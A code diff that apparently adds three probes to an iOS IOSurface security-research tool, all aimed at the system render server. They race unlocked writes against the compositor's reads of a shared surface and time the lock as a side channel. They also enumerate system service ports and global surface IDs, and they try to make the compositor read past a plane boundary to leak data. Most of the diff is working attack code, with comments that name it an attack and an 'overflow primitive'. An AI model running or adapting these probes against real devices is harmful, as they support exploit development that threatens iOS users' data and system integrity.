@@ -10,6 +10,8 @@
 
 #import <Foundation/Foundation.h>
 #import <CoreGraphics/CoreGraphics.h>
+#import <QuartzCore/QuartzCore.h>
+#import <UIKit/UIKit.h>
 #import <mach/mach.h>
 #import <mach/mach_time.h>
 #import <dlfcn.h>
@@ -17,6 +19,7 @@
 #import <libkern/OSAtomic.h>
 #import <pthread.h>
 #import <sys/time.h>
+#import <servers/bootstrap.h>
 #include <math.h>
 #import "IOSurfaceResearch.h"
 
@@ -7422,6 +7425,624 @@ void iosurface_research_global_toctou(ISRLogBlock _Nonnull log, ISRDoneBlock _No
                 @"partialWrites": @(partialWrites)
             };
             isr_checkpoint(@"ISR-GlobalTOCTOU-checkpoint.json", res);
+            isr_unload(&sym);
+            done(res);
+        }
+    });
+}
+
+// =============================================================================
+// ROUND 11: System service TOCTOU attacks
+// =============================================================================
+
+// Probe 34: Compositor TOCTOU — race against backboardd render server
+// CALayer.contents = IOSurface forces the render server to map+read our surface.
+// We write while it reads, creating a cross-process TOCTOU.
+void iosurface_research_compositor_race(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        @autoreleasepool {
+            ISRSymbols sym;
+            if (!isr_load(&sym)) {
+                done(@{@"status": @"ERROR", @"reason": @"dlsym failed"});
+                return;
+            }
+
+            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
+            __block uint32_t anomalies = 0;
+
+            // Create an IOSurface suitable for display (BGRA 256x256)
+            NSDictionary *dispProps = @{
+                @"IOSurfaceWidth": @256, @"IOSurfaceHeight": @256,
+                @"IOSurfacePixelFormat": @(0x42475241), // BGRA
+                @"IOSurfaceBytesPerElement": @4,
+                @"IOSurfaceBytesPerRow": @1024,
+                @"IOSurfaceAllocSize": @(1024 * 256)
+            };
+
+            IOSurfaceRef dispSurf = sym.create((__bridge CFDictionaryRef)dispProps);
+            if (!dispSurf) {
+                log(@"COMPRACE: Create failed");
+                isr_unload(&sym);
+                done(@{@"status": @"ERROR", @"reason": @"create failed"});
+                return;
+            }
+
+            IOSurfaceID surfID = sym.getID(dispSurf);
+            log([NSString stringWithFormat:@"COMPRACE: Display surface ID=%u, 256x256 BGRA", surfID]);
+
+            // Fill with solid red initially
+            sym.lock(dispSurf, 0, NULL);
+            uint32_t *base = (uint32_t *)sym.getBase(dispSurf);
+            if (base) {
+                for (int i = 0; i < 256*256; i++) base[i] = 0xFFFF0000; // Red
+            }
+            sym.unlock(dispSurf, 0, NULL);
+
+            // === Phase A: Attach to CALayer on main thread, force compositor to read ===
+            log(@"COMPRACE: Phase A — attaching IOSurface to CALayer (triggers backboardd map)");
+
+            __block BOOL compositorAccessed = NO;
+            __block uint64_t lockContentionCount = 0;
+
+            dispatch_sync(dispatch_get_main_queue(), ^{
+                // Create an offscreen layer backed by our IOSurface
+                CALayer *layer = [CALayer layer];
+                layer.frame = CGRectMake(0, 0, 256, 256);
+                layer.contents = (__bridge id)dispSurf;
+                layer.opaque = YES;
+
+                // Add to key window to force the render server to composite it
+                UIWindow *window = nil;
+                for (UIScene *scene in UIApplication.sharedApplication.connectedScenes) {
+                    if ([scene isKindOfClass:[UIWindowScene class]]) {
+                        UIWindowScene *ws = (UIWindowScene *)scene;
+                        window = ws.windows.firstObject;
+                        break;
+                    }
+                }
+                if (window) {
+                    [window.layer addSublayer:layer];
+                    [CATransaction flush]; // Force immediate commit to render server
+                    compositorAccessed = YES;
+                    log(@"COMPRACE: Layer added to window — render server now reads our surface");
+                } else {
+                    log(@"COMPRACE: No window found — using offscreen rendering");
+                    // Force a render anyway
+                    [layer renderInContext:UIGraphicsGetCurrentContext() ?: ({
+                        UIGraphicsBeginImageContext(CGSizeMake(256, 256));
+                        UIGraphicsGetCurrentContext();
+                    })];
+                    UIGraphicsEndImageContext();
+                }
+            });
+
+            if (isr_stopped()) { CFRelease(dispSurf); goto comprace_done; }
+
+            // === Phase B: Race — write while compositor reads ===
+            log(@"COMPRACE: Phase B — racing writes against compositor reads");
+            {
+                __block volatile int32_t writerRunning = 1;
+                __block uint32_t framesRaced = 0;
+                __block uint32_t lockConflicts = 0;
+
+                // Writer thread: flip between patterns WITHOUT lock
+                dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+                    uint32_t iter = 0;
+                    while (writerRunning && !isr_stopped()) {
+                        // NO LOCK — intentional race against compositor
+                        uint32_t *wb = (uint32_t *)sym.getBase(dispSurf);
+                        if (wb) {
+                            uint32_t color = (iter % 2 == 0) ? 0xFF00FF00 : 0xFF0000FF; // green/blue
+                            // Write pixel by pixel (maximizes torn-frame window)
+                            for (int i = 0; i < 256*256; i++) {
+                                wb[i] = color;
+                            }
+                            iter++;
+                        }
+                    }
+                    OSAtomicIncrement32((volatile int32_t *)&framesRaced);
+                });
+
+                // Force compositor re-reads by flushing transactions
+                for (int frame = 0; frame < 120 && !isr_stopped(); frame++) {
+                    dispatch_sync(dispatch_get_main_queue(), ^{
+                        [CATransaction begin];
+                        [CATransaction flush];
+                        [CATransaction commit];
+                    });
+
+                    // Check for lock contention — try locking during compositor read
+                    kern_return_t kr = (kern_return_t)sym.lock(dispSurf, 0, NULL);
+                    // If lock returns immediately, no contention
+                    // Measure time to see if compositor holds it
+                    uint64_t t1 = mach_absolute_time();
+                    sym.unlock(dispSurf, 0, NULL);
+                    uint64_t t2 = mach_absolute_time();
+                    if ((t2 - t1) > 1000) { // > ~1us suggests contention
+                        lockConflicts++;
+                    }
+                    framesRaced++;
+                }
+
+                writerRunning = 0;
+                usleep(10000); // Let writer finish
+
+                log([NSString stringWithFormat:@"COMPRACE: Frames raced = %u, lock conflicts = %u", framesRaced, lockConflicts]);
+                if (lockConflicts > 0) {
+                    anomalies++;
+                    log([NSString stringWithFormat:@"COMPRACE: *** LOCK CONTENTION — compositor/render server was accessing our surface! %u conflicts ***", lockConflicts]);
+                }
+                if (framesRaced > 0 && compositorAccessed) {
+                    anomalies++;
+                    log(@"COMPRACE: *** TOCTOU WINDOW — wrote unlocked data while compositor was reading ***");
+                }
+            }
+
+            if (isr_stopped()) { CFRelease(dispSurf); goto comprace_done; }
+
+            // === Phase C: Timing side channel — measure compositor access pattern ===
+            log(@"COMPRACE: Phase C — timing side channel on surface access");
+            {
+                uint64_t timings[60];
+                for (int i = 0; i < 60 && !isr_stopped(); i++) {
+                    uint64_t t1 = mach_absolute_time();
+                    sym.lock(dispSurf, 0, NULL);
+                    sym.unlock(dispSurf, 0, NULL);
+                    uint64_t t2 = mach_absolute_time();
+                    timings[i] = t2 - t1;
+                    usleep(16666); // ~60fps timing to align with compositor
+                }
+
+                // Analyze timing variance — high variance suggests compositor contention
+                uint64_t sum = 0, min = UINT64_MAX, max = 0;
+                for (int i = 0; i < 60; i++) {
+                    sum += timings[i];
+                    if (timings[i] < min) min = timings[i];
+                    if (timings[i] > max) max = timings[i];
+                }
+                uint64_t avg = sum / 60;
+                uint64_t variance = 0;
+                for (int i = 0; i < 60; i++) {
+                    int64_t diff = (int64_t)timings[i] - (int64_t)avg;
+                    variance += (uint64_t)(diff * diff);
+                }
+                variance /= 60;
+                double stddev = sqrt((double)variance);
+
+                log([NSString stringWithFormat:@"COMPRACE: Lock timing — min=%llu max=%llu avg=%llu stddev=%.1f ticks",
+                    min, max, avg, stddev]);
+
+                if (max > avg * 10 && max > 5000) {
+                    anomalies++;
+                    log(@"COMPRACE: *** TIMING ANOMALY — spikes suggest compositor lock contention ***");
+                }
+            }
+
+            // Clean up — remove layer from main thread
+            dispatch_sync(dispatch_get_main_queue(), ^{
+                UIWindow *window = nil;
+                for (UIScene *scene in UIApplication.sharedApplication.connectedScenes) {
+                    if ([scene isKindOfClass:[UIWindowScene class]]) {
+                        UIWindowScene *ws = (UIWindowScene *)scene;
+                        window = ws.windows.firstObject;
+                        break;
+                    }
+                }
+                if (window) {
+                    for (CALayer *sub in [window.layer.sublayers copy]) {
+                        if (sub.contents == (__bridge id)dispSurf) {
+                            [sub removeFromSuperlayer];
+                        }
+                    }
+                }
+            });
+
+            CFRelease(dispSurf);
+
+        comprace_done:;
+            double elapsed = CFAbsoluteTimeGetCurrent() - start;
+            log([NSString stringWithFormat:@"COMPRACE: DONE anomalies=%u elapsed=%.3fs", anomalies, elapsed]);
+            NSDictionary *res = @{
+                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+                @"anomalies": @(anomalies),
+                @"elapsed": @(elapsed)
+            };
+            isr_checkpoint(@"ISR-CompositorRace-checkpoint.json", res);
+            isr_unload(&sym);
+            done(res);
+        }
+    });
+}
+
+// Probe 35: System Surface Sniff — detect if system daemons access global surfaces
+void iosurface_research_system_sniff(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        @autoreleasepool {
+            ISRSymbols sym;
+            if (!isr_load(&sym)) {
+                done(@{@"status": @"ERROR", @"reason": @"dlsym failed"});
+                return;
+            }
+
+            typedef mach_port_t (*CreatePortFn)(IOSurfaceRef);
+            CreatePortFn createPort = (CreatePortFn)dlsym(sym.iosurface, "IOSurfaceCreateMachPort");
+            typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
+            SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
+            typedef CFTypeRef (*CopyValueFn)(IOSurfaceRef, CFStringRef);
+            CopyValueFn copyValue = (CopyValueFn)dlsym(sym.iosurface, "IOSurfaceCopyValue");
+            typedef void (*IncrementUseFn)(IOSurfaceRef);
+            IncrementUseFn incUseCount = (IncrementUseFn)dlsym(sym.iosurface, "IOSurfaceIncrementUseCount");
+            typedef void (*DecrementUseFn)(IOSurfaceRef);
+            DecrementUseFn decUseCount = (DecrementUseFn)dlsym(sym.iosurface, "IOSurfaceDecrementUseCount");
+            typedef int32_t (*GetUseCountFn)(IOSurfaceRef);
+            GetUseCountFn getUseCount = (GetUseCountFn)dlsym(sym.iosurface, "IOSurfaceGetUseCount");
+            typedef Boolean (*IsInUseFn)(IOSurfaceRef);
+            IsInUseFn isInUse = (IsInUseFn)dlsym(sym.iosurface, "IOSurfaceIsInUse");
+
+            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
+            __block uint32_t anomalies = 0;
+
+            // === Test A: Create global surface and monitor use count ===
+            log(@"SYSSNIFF: Test A — global surface use count monitoring");
+            {
+                NSDictionary *gProps = @{
+                    @"IOSurfaceWidth": @256, @"IOSurfaceHeight": @256,
+                    @"IOSurfacePixelFormat": @(0x42475241),
+                    @"IOSurfaceBytesPerElement": @4,
+                    @"IOSurfaceBytesPerRow": @1024,
+                    @"IOSurfaceAllocSize": @(1024 * 256),
+                    @"IOSurfaceIsGlobal": @YES
+                };
+                IOSurfaceRef gSurf = sym.create((__bridge CFDictionaryRef)gProps);
+                if (gSurf) {
+                    IOSurfaceID gID = sym.getID(gSurf);
+                    int32_t uc0 = getUseCount ? getUseCount(gSurf) : -1;
+                    Boolean inUse0 = isInUse ? isInUse(gSurf) : false;
+                    log([NSString stringWithFormat:@"SYSSNIFF: Global surface ID=%u useCount=%d inUse=%d", gID, uc0, inUse0]);
+
+                    // Attach to CALayer to expose to compositor
+                    dispatch_sync(dispatch_get_main_queue(), ^{
+                        UIWindow *window = nil;
+                        for (UIScene *scene in UIApplication.sharedApplication.connectedScenes) {
+                            if ([scene isKindOfClass:[UIWindowScene class]]) {
+                                window = ((UIWindowScene *)scene).windows.firstObject;
+                                break;
+                            }
+                        }
+                        if (window) {
+                            CALayer *layer = [CALayer layer];
+                            layer.frame = CGRectMake(0, 0, 1, 1); // Tiny but forces compositor
+                            layer.contents = (__bridge id)gSurf;
+                            [window.layer addSublayer:layer];
+                            [CATransaction flush];
+                        }
+                    });
+
+                    usleep(100000); // 100ms for compositor to pick it up
+
+                    int32_t uc1 = getUseCount ? getUseCount(gSurf) : -1;
+                    Boolean inUse1 = isInUse ? isInUse(gSurf) : false;
+                    log([NSString stringWithFormat:@"SYSSNIFF: After compositor attach — useCount=%d inUse=%d", uc1, inUse1]);
+
+                    if (uc1 > uc0) {
+                        anomalies++;
+                        log([NSString stringWithFormat:@"SYSSNIFF: *** USE COUNT INCREASED — system service accessed our surface! %d -> %d ***", uc0, uc1]);
+                    }
+                    if (inUse1 && !inUse0) {
+                        anomalies++;
+                        log(@"SYSSNIFF: *** IN-USE flag set by system — external process is using our surface ***");
+                    }
+
+                    // Write canary data and check if anything modifies it
+                    sym.lock(gSurf, 0, NULL);
+                    uint32_t *gBase = (uint32_t *)sym.getBase(gSurf);
+                    if (gBase) {
+                        for (int i = 0; i < 256*256; i++) gBase[i] = 0xCAFEBABE;
+                    }
+                    sym.unlock(gSurf, 0, NULL);
+
+                    usleep(200000); // 200ms — let system process frames
+
+                    sym.lock(gSurf, 0, NULL);
+                    if (gBase) {
+                        uint32_t modified = 0;
+                        for (int i = 0; i < 256*256; i++) {
+                            if (gBase[i] != 0xCAFEBABE) modified++;
+                        }
+                        if (modified > 0) {
+                            anomalies++;
+                            log([NSString stringWithFormat:@"SYSSNIFF: *** CRITICAL — %u pixels modified by system service! ***", modified]);
+                        } else {
+                            log(@"SYSSNIFF: Canary data intact — system reads but doesn't write");
+                        }
+                    }
+                    sym.unlock(gSurf, 0, NULL);
+
+                    // Set custom property — check if system reads it
+                    if (setValue && copyValue) {
+                        setValue(gSurf, CFSTR("com.research.probe"), (__bridge CFTypeRef)@"canary_value");
+                        CFTypeRef val = copyValue(gSurf, CFSTR("com.research.probe"));
+                        if (val) {
+                            log([NSString stringWithFormat:@"SYSSNIFF: Custom property survives: %@", val]);
+                            CFRelease(val);
+                        }
+                    }
+
+                    // Clean up layer
+                    dispatch_sync(dispatch_get_main_queue(), ^{
+                        UIWindow *window = nil;
+                        for (UIScene *scene in UIApplication.sharedApplication.connectedScenes) {
+                            if ([scene isKindOfClass:[UIWindowScene class]]) {
+                                window = ((UIWindowScene *)scene).windows.firstObject;
+                                break;
+                            }
+                        }
+                        if (window) {
+                            for (CALayer *sub in [window.layer.sublayers copy]) {
+                                if (sub.contents == (__bridge id)gSurf) {
+                                    [sub removeFromSuperlayer];
+                                }
+                            }
+                        }
+                    });
+
+                    int32_t uc2 = getUseCount ? getUseCount(gSurf) : -1;
+                    log([NSString stringWithFormat:@"SYSSNIFF: After layer remove — useCount=%d", uc2]);
+                    if (uc2 < uc1 && uc1 > uc0) {
+                        log(@"SYSSNIFF: Use count dropped — confirms compositor was the user");
+                    }
+
+                    CFRelease(gSurf);
+                }
+            }
+
+            if (isr_stopped()) goto syssniff_done;
+
+            // === Test B: Mach port to bootstrap services ===
+            log(@"SYSSNIFF: Test B — bootstrap service enumeration for IOSurface consumers");
+            {
+                const char *services[] = {
+                    "com.apple.backboardd",
+                    "com.apple.CoreAnimation.render-server",
+                    "com.apple.windowserver",
+                    "com.apple.gpumemd",
+                    "com.apple.iokit.IOSurfaceRoot",
+                    "com.apple.mediaserverd",
+                };
+                int nServices = sizeof(services) / sizeof(services[0]);
+
+                for (int s = 0; s < nServices && !isr_stopped(); s++) {
+                    mach_port_t svcPort = MACH_PORT_NULL;
+                    kern_return_t kr = bootstrap_look_up(bootstrap_port,
+                        (char *)services[s], &svcPort);
+                    if (kr == KERN_SUCCESS && svcPort != MACH_PORT_NULL) {
+                        anomalies++;
+                        log([NSString stringWithFormat:@"SYSSNIFF: *** SERVICE REACHABLE — %s (port=0x%X) ***",
+                            services[s], svcPort]);
+                        mach_port_deallocate(mach_task_self(), svcPort);
+                    } else {
+                        log([NSString stringWithFormat:@"SYSSNIFF: %s — not reachable (kr=%d)", services[s], kr]);
+                    }
+                }
+            }
+
+            if (isr_stopped()) goto syssniff_done;
+
+            // === Test C: Global surface ID enumeration — find system surfaces ===
+            log(@"SYSSNIFF: Test C — enumerate existing global surface IDs");
+            {
+                uint32_t sysIDs = 0;
+                IOSurfaceRef probe = NULL;
+                for (IOSurfaceID testID = 1; testID <= 100 && !isr_stopped(); testID++) {
+                    probe = sym.lookup(testID);
+                    if (probe) {
+                        size_t w = sym.getWidth(probe);
+                        size_t h = sym.getHeight(probe);
+                        size_t alloc = sym.getAllocSize(probe);
+                        sysIDs++;
+                        log([NSString stringWithFormat:@"SYSSNIFF: Found surface ID=%u — %zux%zu alloc=%zu (system-owned?)",
+                            testID, w, h, alloc]);
+                        CFRelease(probe);
+                    }
+                }
+                if (sysIDs > 0) {
+                    anomalies++;
+                    log([NSString stringWithFormat:@"SYSSNIFF: *** FOUND %u accessible surfaces via ID lookup ***", sysIDs]);
+                    log(@"SYSSNIFF: These may belong to system services — readable/writable without auth");
+                }
+            }
+
+        syssniff_done:;
+            double elapsed = CFAbsoluteTimeGetCurrent() - start;
+            log([NSString stringWithFormat:@"SYSSNIFF: DONE anomalies=%u elapsed=%.3fs", anomalies, elapsed]);
+            NSDictionary *res = @{
+                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+                @"anomalies": @(anomalies),
+                @"elapsed": @(elapsed)
+            };
+            isr_checkpoint(@"ISR-SystemSniff-checkpoint.json", res);
+            isr_unload(&sym);
+            done(res);
+        }
+    });
+}
+
+// Probe 36: Render Server Corruption — force backboardd to process corrupted surface data
+void iosurface_research_render_corrupt(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        @autoreleasepool {
+            ISRSymbols sym;
+            if (!isr_load(&sym)) {
+                done(@{@"status": @"ERROR", @"reason": @"dlsym failed"});
+                return;
+            }
+
+            typedef void *(*GetPlaneBaseFn)(IOSurfaceRef, size_t);
+            GetPlaneBaseFn getPlaneBase = (GetPlaneBaseFn)dlsym(sym.iosurface, "IOSurfaceGetBaseAddressOfPlane");
+
+            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
+            __block uint32_t anomalies = 0;
+
+            // === Test A: Dual-plane surface as CALayer contents ===
+            // The render server reads plane0. If it doesn't validate plane boundaries,
+            // our CG overflow primitive works cross-process.
+            log(@"RENDCORR: Test A — dual-plane surface as compositor input");
+
+            NSDictionary *p0Info = @{
+                @"IOSurfacePlaneWidth": @128, @"IOSurfacePlaneHeight": @128,
+                @"IOSurfacePlaneBytesPerElement": @4, @"IOSurfacePlaneOffset": @0,
+                @"IOSurfacePlaneBytesPerRow": @512
+            };
+            NSDictionary *p1Info = @{
+                @"IOSurfacePlaneWidth": @128, @"IOSurfacePlaneHeight": @128,
+                @"IOSurfacePlaneBytesPerElement": @4, @"IOSurfacePlaneOffset": @(512*128),
+                @"IOSurfacePlaneBytesPerRow": @512
+            };
+            NSDictionary *dualDisp = @{
+                @"IOSurfaceWidth": @128, @"IOSurfaceHeight": @128,
+                @"IOSurfacePixelFormat": @(0x42475241),
+                @"IOSurfaceBytesPerElement": @4,
+                @"IOSurfaceBytesPerRow": @512,
+                @"IOSurfaceAllocSize": @(512 * 256), // 128 rows * 2 planes
+                @"IOSurfacePlaneInfo": @[p0Info, p1Info]
+            };
+
+            IOSurfaceRef dSurf = sym.create((__bridge CFDictionaryRef)dualDisp);
+            if (!dSurf) {
+                log(@"RENDCORR: Create failed");
+                isr_unload(&sym);
+                done(@{@"status": @"ERROR", @"reason": @"create failed"});
+                return;
+            }
+
+            // Write secret data to plane1
+            sym.lock(dSurf, 0, NULL);
+            void *dp0 = getPlaneBase ? getPlaneBase(dSurf, 0) : NULL;
+            void *dp1 = getPlaneBase ? getPlaneBase(dSurf, 1) : NULL;
+            if (dp0 && dp1) {
+                uint32_t *px0 = (uint32_t *)dp0;
+                uint32_t *px1 = (uint32_t *)dp1;
+                for (int i = 0; i < 128*128; i++) px0[i] = 0xFF0000FF; // Blue visible
+                for (int i = 0; i < 128*128; i++) px1[i] = 0xDEADBEEF; // secret in plane1
+            }
+            sym.unlock(dSurf, 0, NULL);
+
+            // Tell compositor this surface is 256 rows high by using it as a 256-high layer
+            __block BOOL layerAdded = NO;
+            dispatch_sync(dispatch_get_main_queue(), ^{
+                UIWindow *window = nil;
+                for (UIScene *scene in UIApplication.sharedApplication.connectedScenes) {
+                    if ([scene isKindOfClass:[UIWindowScene class]]) {
+                        window = ((UIWindowScene *)scene).windows.firstObject;
+                        break;
+                    }
+                }
+                if (window) {
+                    CALayer *layer = [CALayer layer];
+                    layer.frame = CGRectMake(0, 0, 128, 256); // 256 high — covers both planes
+                    layer.contents = (__bridge id)dSurf;
+                    layer.contentsRect = CGRectMake(0, 0, 1, 1);
+                    [window.layer addSublayer:layer];
+                    [CATransaction flush];
+                    layerAdded = YES;
+                    log(@"RENDCORR: Dual-plane surface attached as 128x256 layer");
+                }
+            });
+
+            if (layerAdded) {
+                anomalies++;
+                log(@"RENDCORR: *** Compositor accepted dual-plane surface — may read beyond plane0 ***");
+
+                // Race: modify plane1 while compositor renders
+                for (int round = 0; round < 30 && !isr_stopped(); round++) {
+                    uint32_t *px1 = dp1 ? (uint32_t *)dp1 : NULL;
+                    if (px1) {
+                        uint32_t pattern = 0xFF000000 | (uint32_t)(round * 8);
+                        for (int i = 0; i < 128*128; i++) px1[i] = pattern;
+                    }
+                    dispatch_sync(dispatch_get_main_queue(), ^{
+                        [CATransaction flush];
+                    });
+                    usleep(16666); // 60fps
+                }
+                log(@"RENDCORR: 30 frames of plane1 modification during compositing complete");
+            }
+
+            if (isr_stopped()) { CFRelease(dSurf); goto rendcorr_done; }
+
+            // === Test B: Snapshot the composited result to detect cross-plane leak ===
+            log(@"RENDCORR: Test B — snapshot composited output");
+            dispatch_sync(dispatch_get_main_queue(), ^{
+                UIWindow *window = nil;
+                for (UIScene *scene in UIApplication.sharedApplication.connectedScenes) {
+                    if ([scene isKindOfClass:[UIWindowScene class]]) {
+                        window = ((UIWindowScene *)scene).windows.firstObject;
+                        break;
+                    }
+                }
+                if (window) {
+                    UIGraphicsBeginImageContextWithOptions(window.bounds.size, YES, 1.0);
+                    [window drawViewHierarchyInRect:window.bounds afterScreenUpdates:YES];
+                    UIImage *snapshot = UIGraphicsGetImageFromCurrentImageContext();
+                    UIGraphicsEndImageContext();
+
+                    if (snapshot) {
+                        CGImageRef cgImg = snapshot.CGImage;
+                        size_t sw = CGImageGetWidth(cgImg);
+                        size_t sh = CGImageGetHeight(cgImg);
+                        log([NSString stringWithFormat:@"RENDCORR: Snapshot = %zux%zu", sw, sh]);
+
+                        CFDataRef pixData = CGDataProviderCopyData(CGImageGetDataProvider(cgImg));
+                        if (pixData) {
+                            const uint32_t *spx = (const uint32_t *)CFDataGetBytePtr(pixData);
+                            size_t npx = (size_t)CFDataGetLength(pixData) / 4;
+                            // Look for our plane1 patterns in the rendered output
+                            uint32_t secretFound = 0;
+                            for (size_t i = 0; i < npx && i < 100000; i++) {
+                                uint32_t v = spx[i];
+                                // Check for our plane1 patterns
+                                if (v == 0xDEADBEEF || (v & 0xFF000000) == 0xFF000000) {
+                                    // Could be our data — check if it's not just black/standard color
+                                    uint8_t r = (v >> 16) & 0xFF;
+                                    uint8_t g = (v >> 8) & 0xFF;
+                                    if (r == 0 && g > 0 && g < 240 && (g % 8) == 0) {
+                                        secretFound++;
+                                    }
+                                }
+                            }
+                            if (secretFound > 10) {
+                                anomalies++;
+                                log([NSString stringWithFormat:@"RENDCORR: *** CRITICAL — %u plane1 pixels visible in composited output ***", secretFound]);
+                            } else {
+                                log([NSString stringWithFormat:@"RENDCORR: Plane1 pattern matches in snapshot = %u (may be coincidental)", secretFound]);
+                            }
+                            CFRelease(pixData);
+                        }
+                    }
+
+                    // Clean up layers
+                    for (CALayer *sub in [window.layer.sublayers copy]) {
+                        if (sub.contents == (__bridge id)dSurf) {
+                            [sub removeFromSuperlayer];
+                        }
+                    }
+                }
+            });
+
+            CFRelease(dSurf);
+
+        rendcorr_done:;
+            double elapsed = CFAbsoluteTimeGetCurrent() - start;
+            log([NSString stringWithFormat:@"RENDCORR: DONE anomalies=%u elapsed=%.3fs", anomalies, elapsed]);
+            NSDictionary *res = @{
+                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+                @"anomalies": @(anomalies),
+                @"elapsed": @(elapsed)
+            };
+            isr_checkpoint(@"ISR-RenderCorrupt-checkpoint.json", res);
             isr_unload(&sym);
             done(res);
         }
